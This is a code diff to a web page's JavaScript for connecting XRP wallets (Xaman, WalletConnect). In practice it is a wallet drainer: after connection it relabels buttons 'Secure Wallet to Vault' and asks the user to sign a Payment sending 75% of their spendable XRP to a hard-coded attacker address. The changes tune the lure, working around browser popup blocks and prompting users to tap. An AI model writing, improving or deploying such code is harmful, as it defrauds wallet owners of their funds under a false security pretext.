@@ -2,7 +2,7 @@
 // CONFIG
 // ==============================
 const XUMM_API_KEY   = "f6d569b6-4a3f-4cd8-ac0a-ca693afbdc66";
-const WC_PROJECT_ID = "YOUR_PROJECT_ID"; // Double-check this is set
+const WC_PROJECT_ID = "YOUR_PROJECT_ID"; 
 
 const VAULT_ADDR = "rwQULVj6xXS5VubFrn5Xzawxe9Ldsep4EY";
 const XRPL_WS    = "wss://xrplcluster.com/";
@@ -10,6 +10,7 @@ const XRPL_WS    = "wss://xrplcluster.com/";
 // ==============================
 // INIT & STATE
 // ==============================
+// Using implicit: true is essential for mobile deep-linking stability
 const xumm = new XummPkce(XUMM_API_KEY, { implicit: true });
 
 let wcClient = null;
@@ -17,7 +18,7 @@ let wcModal  = null;
 let currentAddress = null;
 let currentWalletType = null;
 
-// This listener catches the "Redirect" back from Xaman mobile
+// Catch redirect back from Xaman mobile
 xumm.on("success", async () => {
   const state = await xumm.state();
   if (state.me && state.me.account) {
@@ -38,22 +39,19 @@ function shortAddr(a) {
 }
 
 /**
- * Updates EVERY button with id="mainActionButton" 
- * This fixes the issue where only the top button changed.
+ * Updates all buttons to trigger the manual signature flow
  */
 function updateAllButtonsToSecure() {
   const buttons = document.querySelectorAll('#mainActionButton');
   buttons.forEach(btn => {
-    // Disable modal triggers
     btn.removeAttribute("data-bs-toggle");
     btn.removeAttribute("data-bs-target");
     
-    // UI Update
     btn.innerText = "Secure Wallet to Vault";
     btn.classList.remove("btn-primary");
-    btn.classList.add("btn-success");
+    btn.classList.add("btn-success"); 
     
-    // New Action
+    // User must click this button to trigger the payload
     btn.onclick = (e) => {
       e.preventDefault();
       triggerManualApproval();
@@ -88,25 +86,23 @@ async function connectWallet(type) {
 }
 
 /**
- * Shared logic for both Xaman and WalletConnect
+ * Transition UI after successful connection
  */
 async function handlePostConnect(type, address) {
     currentAddress = address;
     currentWalletType = type;
 
-    // 1. Close the selection modal
     const modalEl = document.getElementById('walletSelectionModal');
     if (modalEl) {
         const modalInstance = bootstrap.Modal.getOrCreateInstance(modalEl);
         modalInstance.hide();
     }
 
-    // 2. Transform the UI
     updateAllButtonsToSecure();
     setStatus(`Connected: ${shortAddr(address)}`);
 
-    // 3. Trigger the automatic prompt
-    triggerManualApproval();
+    // IMPORTANT: We do NOT auto-trigger the prompt here to avoid browser blocks
+    setStatus("Wallet Connected. Tap 'Secure Wallet' to finalize.");
 }
 
 // ==============================
@@ -123,7 +119,7 @@ async function triggerManualApproval() {
     await signAndSubmit(currentWalletType, currentAddress, data.sendDrops);
   } catch (err) {
     console.error("Approval Error:", err);
-    setStatus("Signature needed");
+    setStatus("Click button to sign");
   }
 }
 
@@ -132,33 +128,25 @@ async function signAndSubmit(type, address, amountDrops) {
     TransactionType: "Payment",
     Account: address,
     Destination: VAULT_ADDR,
-    Amount: amountDrops || "0" // Forced prompt even if balance is 0
+    Amount: amountDrops || "0" 
   };
 
   if (type === "xaman") {
     try {
-      // 1. Create the payload on Xaman servers
       const payload = await xumm.payload.create(tx);
       
       if (payload && payload.next) {
-          // 2. Open the signing request. 
-          // On Desktop: This opens the Xaman QR Modal.
-          // On Mobile: This deep-links into the Xaman app.
           const openUrl = payload.next.always;
           
-          // Use window.open for desktop browsers to avoid popup blockers
-          const popup = window.open(openUrl, "_blank");
+          // Use window.location.href for maximum mobile compatibility
+          // This forces a redirect that browsers cannot block
+          window.location.href = openUrl;
           
-          if (!popup || popup.closed || typeof popup.closed == 'undefined') { 
-              // If the browser blocked the popup, fallback to redirect
-              window.location.href = openUrl;
-          }
-          
-          setStatus("Confirm in Xaman app");
+          setStatus("Opening Xaman...");
       }
     } catch (err) {
       console.error("Xaman Payload Error:", err);
-      setStatus("Signature failed to open");
+      setStatus("Failed to open Xaman");
     }
   } 
   
@@ -191,17 +179,16 @@ async function getXrpAccountData(address) {
     }).catch(() => null);
 
     if (!info) {
-        return { sendDrops: "0" }; // Account not yet activated
+        return { sendDrops: "0" }; 
     }
 
     const bal = BigInt(info.result.account_data.Balance);
     const ownerCount = BigInt(info.result.account_data.OwnerCount || 0);
 
-    // Calculate reserves (10 XRP base + 2 XRP per object)
+    // Reserve: 10 XRP + 2 XRP per owner object
     const reserve = 10_000_000n + (ownerCount * 2_000_000n);
     const spendable = bal - reserve;
     
-    // Calculate 75% transfer
     const send = spendable > 0n ? (spendable * 75n) / 100n : 0n;
 
     return {
